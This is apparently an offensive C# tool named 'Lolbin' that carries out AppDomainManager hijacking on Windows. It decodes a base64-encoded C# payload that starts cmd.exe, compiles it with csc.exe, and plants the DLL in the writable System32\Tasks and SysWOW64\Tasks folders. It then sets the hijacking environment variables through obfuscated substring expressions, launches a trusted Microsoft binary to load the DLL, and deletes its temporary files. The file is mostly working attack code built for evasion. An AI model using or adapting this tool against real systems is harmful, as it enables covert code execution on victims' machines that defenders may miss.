using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Reflection;
using System.Runtime.Hosting;
using System.Dynamic;

namespace Lolbin
{
    class Program
    {

        private static string CmdPath = @"C:\Windows\System32\cmd.exe";
        /// <summary>
        /// 执行cmd命令 返回cmd窗口显示的信息
        /// 多命令请使用批处理命令连接符：
        /// <![CDATA[
        /// &:同时执行两个命令
        /// |:将上一个命令的输出,作为下一个命令的输入
        /// &&：当&&前的命令成功时,才执行&&后的命令
        /// ||：当||前的命令失败时,才执行||后的命令]]>
        /// </summary>
        /// <param name="cmd">执行的命令</param>
        public static string RunCmd(string cmd)
        {
            cmd = cmd.Trim().TrimEnd('&') + "&exit";//说明：不管命令是否成功均执行exit命令，否则当调用ReadToEnd()方法时，会处于假死状态
            using (Process p = new Process())
            {
                p.StartInfo.FileName = CmdPath;
                p.StartInfo.UseShellExecute = false;        //是否使用操作系统shell启动
                p.StartInfo.RedirectStandardInput = true;   //接受来自调用程序的输入信息
                p.StartInfo.RedirectStandardOutput = true;  //由调用程序获取输出信息
                p.StartInfo.RedirectStandardError = true;   //重定向标准错误输出
                p.StartInfo.CreateNoWindow = true;          //不显示程序窗口
                p.Start();//启动程序

                //向cmd窗口写入命令
                p.StandardInput.WriteLine(cmd);
                p.StandardInput.AutoFlush = true;

                //获取cmd窗口的输出信息
                string output = p.StandardOutput.ReadToEnd();
                p.WaitForExit();//等待程序执行完退出进程
                p.Close();

                return output;
            }
        }
        public static string DecodeBase64(string code_type, string code)
        {
            string decode = "";
            byte[] bytes = Convert.FromBase64String(code);
            try
            {
                decode = Encoding.GetEncoding(code_type).GetString(bytes);
            }
            catch
            {
                decode = code;
            }
            return decode;
        }
        static public void Main(string[] args)
        {
            if (System.IO.File.Exists("C:\\Windows\\Temp\\tasks.cs")) {
                System.IO.File.Delete("C:\\Windows\\Temp\\tasks.cs");
                System.IO.File.Delete("C:\\Windows\\Temp\\tasks.dll");
            }
            string payload = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRW50ZXJwcmlzZVNlcnZpY2VzOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7Cgp1c2luZyBTeXN0ZW0uSU87CnVzaW5nIFN5c3RlbS5SZWZsZWN0aW9uOwp1c2luZyBTeXN0ZW0uUnVudGltZS5Ib3N0aW5nOwoKdXNpbmcgU3lzdGVtLkR5bmFtaWM7CgoKCi8qCkFwcGRvbWFpbiBNYW5hZ2VyLCBsb29rcyBmb3IgZW1iZWRkZWQgTWFuaWZlc3Qgb24gTG9hZAoqLwoKW0NvbVZpc2libGUodHJ1ZSldCltHdWlkKCIzMUQyQjk2OS03NjA4LTQyNkUtOUQ4RS1BMDlGQzlBNUFCQ0QiKV0KW0NsYXNzSW50ZXJmYWNlKENsYXNzSW50ZXJmYWNlVHlwZS5Ob25lKV0KCnB1YmxpYyBzZWFsZWQgY2xhc3MgTXlBcHBEb21haW5NYW5hZ2VyIDogQXBwRG9tYWluTWFuYWdlcgp7CiAgCiAgICBwdWJsaWMgb3ZlcnJpZGUgdm9pZCBJbml0aWFsaXplTmV3RG9tYWluKEFwcERvbWFpblNldHVwIGFwcERvbWFpbkluZm8pCiAgICB7CgkJLy9Db25zb2xlLldyaXRlTGluZSgiQXBwRG9tYWluIC0gS2FCb29tISIpOwoJCS8vU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveC5TaG93KCJLYWJvb20hIik7CgkJCgkJU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MuU3RhcnQoImNtZC5leGUiKTsKICAgICAgICByZXR1cm47CiAgICB9Cn0KCi8qCkM6XFdpbmRvd3NcTWljcm9zb2Z0Lk5FVFxGcmFtZXdvcmtcdjQuMC4zMDMxOVxjc2MuZXhlIC90YXJnZXQ6bGlicmFyeSAvb3V0OnRhc2tzLmRsbCB0YXNrcy5jcwpzZXQgQVBQRE9NQUlOX01BTkFHRVJfQVNNPXRhc2tzLCBWZXJzaW9uPTAuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbApzZXQgQVBQRE9NQUlOX01BTkFHRVJfVFlQRT1NeUFwcERvbWFpbk1hbmFnZXIKc2V0IENPTVBMVVNfVmVyc2lvbj12NC4wLjMwMzE5CgpkZWwgQzpcV2luZG93c1xTeXN0ZW0zMlxUYXNrc1x0YXNrcy5kbGwKZGVsIEM6XFdpbmRvd3NcU3lzV293NjRcVGFza3NcdGFza3MuZGxsCgoKY29weSAvWSB0YXNrcy5kbGwgQzpcV2luZG93c1xTeXN0ZW0zMlxUYXNrc1x0YXNrcy5kbGwKY29weSAvWSB0YXNrcy5kbGwgQzpcV2luZG93c1xTeXNXb3c2NFxUYXNrc1x0YXNrcy5kbGwKCgoKUG93ZXJTaGVsbCBFeGFtcGxlOgokZW52OkFQUERPTUFJTl9NQU5BR0VSX0FTTT0idGFza3MsIFZlcnNpb249MC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1udWxsIgokZW52OkFQUERPTUFJTl9NQU5BR0VSX1RZUEU9TXlBcHBEb21haW5NYW5hZ2VyCiRlbnY6Q09NUExVU19WZXJzaW9uPXY0LjAuMzAzMTkKCgpUcmlnZ2VyIC5ORVQgQXBwbGljYXRpb25zCgpbU2FtcGxlIFBvd2VyU2hlbGwgQXJzZW5hbCBxdWVyeSBdCgpnY2kgQzpcV2luZG93c1xTeXN0ZW0zMlwqLmV4ZSB8IEdldC1QRSB8IFdoZXJlLU9iamVjdCB7ICAkXy5JbXBvcnRzLk1vZHVsZU5hbWUgLUNvbnRhaW5zICJtc2NvcmVlLmRsbCIgfQoKRmlsZUhpc3RvcnkuZXhlIC8/CgpNaWNyb3NvZnQuVWV2LlN5bmNDb250cm9sbGVyLmV4ZQoKUHJlc2VudGF0aW9uSG9zdC5leGUKCnN0b3JkaWFnLmV4ZQoKVHNXcGZXcnAuZXhlCgpVZXZBZ2VudFBvbGljeUdlbmVyYXRvci5leGUKClVldkFwcE1vbml0b3IuZXhlCgpVZXZUZW1wbGF0ZUJhc2VsaW5lR2VuZXJhdG9yLmV4ZQoKVWV2VGVtcGxhdGVDb25maWdJdGVtR2VuZXJhdG9yLmV4ZQoKClRyaWdnZXIgdmlhIE9uZS1MaW5lcgptc2h0YS5leGUgamF2YXNjcmlwdDphPW5ldyUyMEFjdGl2ZVhPYmplY3QoIlN5c3RlbS5PYmplY3QiKTtjbG9zZSgpOwpydW5kbGwzMi5leGUgamF2YXNjcmlwdDoiXC4uXG1zaHRtbCxSdW5IVE1MQXBwbGljYXRpb24gIjthPW5ldyUyMEFjdGl2ZVhPYmplY3QoIlN5c3RlbS5PYmplY3QiKTtjbG9zZSgpOwoKVHJpZ2dlciBWaWEgSlNjcmlwdAoKLy8gdmFyIG1hbmlmZXN0IHN0cmluZyBzaG91bGQgYmUgVVRGLTE2Ci8vIENvbnRyb2xzIHRoZSBzZWFyY2ggcGF0aCBmb3IgdW5tYW5nZWQgZGxscwpuZXcgQWN0aXZlWE9iamVjdCgnV1NjcmlwdC5TaGVsbCcpLkVudmlyb25tZW50KCdQcm9jZXNzJykoJ0NPTVBMVVNfVmVyc2lvbicpID0gJ3Y0LjAuMzAzMTknOwpuZXcgQWN0aXZlWE9iamVjdCgnV1NjcmlwdC5TaGVsbCcpLkVudmlyb25tZW50KCdQcm9jZXNzJykoJ0FQUERPTUFJTl9NQU5BR0VSX0FTTScpID0gJ1Rhc2tzLCBWZXJzaW9uPTAuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbCc7Cm5ldyBBY3RpdmVYT2JqZWN0KCdXU2NyaXB0LlNoZWxsJykuRW52aXJvbm1lbnQoJ1Byb2Nlc3MnKSgnQVBQRE9NQUlOX01BTkFHRVJfVFlQRScpID0gJ015QXBwRG9tYWluTWFuYWdlcic7CgoKdmFyIG8gPSBuZXcgQWN0aXZlWE9iamVjdCgiU3lzdGVtLk9iamVjdCIpOyAvLyBUcmlnZ2VyIEFwcERvbWFpbk1hbmFnZXIgTG9hZAoKLy8gSWRlYWxseSwgd2UgY3JlYXRlIGEgRExMLCBkcm9wIGl0IGFueXdoZXJlIGFuZCBsb2FkIGl0IGxpa2UgRHluYW1pY1dyYXBwZXIuLi4KCi8vIExvYWRzIEFzc2VtYmx5LCBidXQgZXhwZWN0cyBpdCBpbiB0aGUgQzpcV2luZG93c1xTeXN0ZW0zMiBmb3IgZXhhbXBsZSBmb3IgbWFuYWdlZCBjb2RlLi4uCi8vIEdvb2QgbmV3cywgQ0xSIHRyaWVzIHRvIHJlc29sdmUgaW4gc3ViIGRpciB3aXRoIG5hbWUgb2YgYXBwLiAgCi8vIFNpbmNlIEM6XFdpbmRvd3Ncc3lzdGVtMzJcdGFza3MgaXMgdXNlciB3cml0YWJsZS4uLiA6KSBDTFIgZmluZHMgYW5kIGxvYWRzIG91ciBhc3NlbWJseS4KCm5ldyBBY3RpdmVYT2JqZWN0KCdXU2NyaXB0LlNoZWxsJykuRW52aXJvbm1lbnQoJ1Byb2Nlc3MnKSgnVE1QJykgPSAnQzpcXFRvb2xzJzsKdmFyIG1hbmlmZXN0ID0gJzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi0xNiIgc3RhbmRhbG9uZT0ieWVzIj8+PGFzc2VtYmx5IG1hbmlmZXN0VmVyc2lvbj0iMS4wIiB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEiIHhtbG5zOmFzbXYzPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+PGFzc2VtYmx5SWRlbnRpdHkgbmFtZT0idGFza3MiIHR5cGU9IndpbjMyIiB2ZXJzaW9uPSIwLjAuMC4wIiAvPjxkZXNjcmlwdGlvbj5CdWlsdCB3aXRoIGxvdmUgYnkgQ2FzZXkgU21pdGggQHN1YlRlZSA8L2Rlc2NyaXB0aW9uPjxjbHJDbGFzcyAgIG5hbWU9Ik15RExMLk9wZXJhdGlvbnMiICAgY2xzaWQ9InszMUQyQjk2OS03NjA4LTQyNkUtOUQ4RS1BMDlGQzlBNUFDREN9IiAgIHByb2dpZD0iTXlETEwuT3BlcmF0aW9ucyIgICBydW50aW1lVmVyc2lvbj0idjQuMC4zMDMxOSIgICB0aHJlYWRpbmdNb2RlbD0iQm90aCIgLz48ZmlsZSBuYW1lPSJ0YXNrcy5kbGwiPiA8L2ZpbGU+PC9hc3NlbWJseT4nOwoKdmFyIGF4ID0gbmV3IEFjdGl2ZVhPYmplY3QoIk1pY3Jvc29mdC5XaW5kb3dzLkFjdEN0eCIpOwoKYXguTWFuaWZlc3RUZXh0ID0gbWFuaWZlc3Q7Cgp2YXIgZHd4ID0gYXguQ3JlYXRlT2JqZWN0KCJNeURMTC5PcGVyYXRpb25zIik7CldTY3JpcHQuU3RkT3V0LldyaXRlTGluZShkd3guZ2V0VmFsdWUxKCJhIikpOwpXU2NyaXB0LlN0ZE91dC5Xcml0ZUxpbmUoZHd4LmdldFZhbHVlMigpKTsKCgoKCiovCgoKCgpuYW1lc3BhY2UgTXlETEwKewoJIAoJIFtDb21WaXNpYmxlKHRydWUpXQoJIFtHdWlkKCIzMUQyQjk2OS03NjA4LTQyNkUtOUQ4RS1BMDlGQzlBNUFDREMiKV0KCSBbQ2xhc3NJbnRlcmZhY2UoQ2xhc3NJbnRlcmZhY2VUeXBlLk5vbmUpXQoJIFtQcm9nSWQoIk15RExMLk9wZXJhdGlvbnMiKV0KCSBwdWJsaWMgY2xhc3MgT3BlcmF0aW9ucyAvLzogRHluYW1pY09iamVjdAoJIHsKCQkgCgkJIHB1YmxpYyBPcGVyYXRpb25zKCkKCQkgewoJCQkgQ29uc29sZS5Xcml0ZUxpbmUoIlNvIEl0IEJlZ2lucyIpOwoJCSB9CgkJIAoJCSBbQ29tVmlzaWJsZSh0cnVlKV0KCQkgcHVibGljIHN0cmluZyBnZXRWYWx1ZTEoc3RyaW5nIHNQYXJhbWV0ZXIpCgkJIHsKCQkJIHN3aXRjaCAoc1BhcmFtZXRlcikKCQkJIHsKCQkJCSBjYXNlICJhIjoKCQkJCSByZXR1cm4gIkEgd2FzIGNob3NlbiI7CgoJCQkJIGNhc2UgImIiOgoJCQkJIHJldHVybiAiQiB3YXMgY2hvc2VuIjsKCgkJCQkgY2FzZSAiYyI6CgkJCQkgcmV0dXJuICJDIHdhcyBjaG9zZW4iOwoKCQkJCSBkZWZhdWx0OgoJCQkJIHJldHVybiAiT3RoZXIiOwoJCQl9CgkJfQoJCSAKCQkgW0NvbVZpc2libGUodHJ1ZSldCgkJIHB1YmxpYyBzdHJpbmcgZ2V0VmFsdWUyKCkKCQkgewoJCQlyZXR1cm4gIkZyb20gVkJTIFN0cmluZyBGdW5jdGlvbiI7CgkJIH0KCQkgCgkJIAoJCSAKCSB9Cn0K";
            StreamWriter sw = new StreamWriter("C:\\Windows\\Temp\\tasks.cs", true);
            sw.WriteLine(DecodeBase64("utf-8", payload));
            sw.Close();
            RunCmd("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:C:\\Windows\\Temp\\tasks.dll C:\\Windows\\Temp\\tasks.cs");
            if (System.IO.File.Exists("C:\\Windows\\System32\\Tasks\\tasks.dll"))
            {
                System.IO.File.Delete("C:\\Windows\\System32\\Tasks\\tasks.dll");
            }

            if (System.IO.File.Exists("C:\\Windows\\SysWOW64\\Tasks\\tasks.dll"))
            {
                System.IO.File.Delete("C:\\Windows\\SysWOW64\\Tasks\\tasks.dll");
            }
            RunCmd("copy /Y C:\\Windows\\Temp\\tasks.dll C:\\Windows\\System32\\Tasks\\tasks.dll");
            RunCmd("copy /Y C:\\Windows\\Temp\\tasks.dll C:\\Windows\\SysWOW64\\Tasks\\tasks.dll");
            RunCmd("set%CommonProgramW6432:~23,1%%TEMP:~-18,1%PPDOMAIN_MA%OS:~8,-1%AGER_ASM=ta%HOMEPATH:~2,1%ks,%ProgramFiles:~10,-5%Version=0.0.0.0,%ProgramFiles:~-6,1%%CommonProgramW6432:~17,-11%%PUBLIC:~10,1%ltu%LOCALAPPDATA:~6,1%%CommonProgramFiles(x86):~-2,-1%=n%ProgramFiles:~14,-1%utral, P%PUBLIC:~-5,-4%%PUBLIC:~-4,-3%licK%ProgramFiles:~14,1%yTok%CommonProgramFiles:~27,-1%n=n%PUBLIC:~10,1%%ProgramFiles:~13,1%%CommonProgramW6432:~26,1%&&set %CommonProgramW6432:~17,-11%OMP%LOCALAPPDATA:~-5,-4%US_V%CommonProgramW6432:~-15,-14%r%CommonProgramFiles:~-14,1%i%LOCALAPPDATA:~-4,1%%APPDATA:~-2,-1%=v4.0.30319&&set AP%ProgramFiles(x86):~-19,-18%DOMAIN%OS:~-3,-2%M%TEMP:~-18,-17%N%TEMP:~-18,1%%PROMPT:~3,1%E%APPDATA:~-7,-6%%OS:~-3,1%TYPE=My%LOCALAPPDATA:~-13,1%pp%ProgramData:~10,-3%omai%APPDATA:~-2,-1%Man%TMP:~-14,-13%g%TEMP:~-3,1%r&&Uev%TMP:~-18,1%%TEMP:~-1,1%pM%windir:~-3,-2%%windir:~-5,-4%%APPDATA:~-3,-2%%ALLUSERSPROFILE:~-2,-1%%ProgramFiles(x86):~-17,1%r.ex%TEMP:~-3,1%");
            System.IO.File.Delete("C:\\Windows\\Temp\\tasks.cs");
            System.IO.File.Delete("C:\\Windows\\Temp\\tasks.dll");
            //Console.ReadKey();
        }
    }
}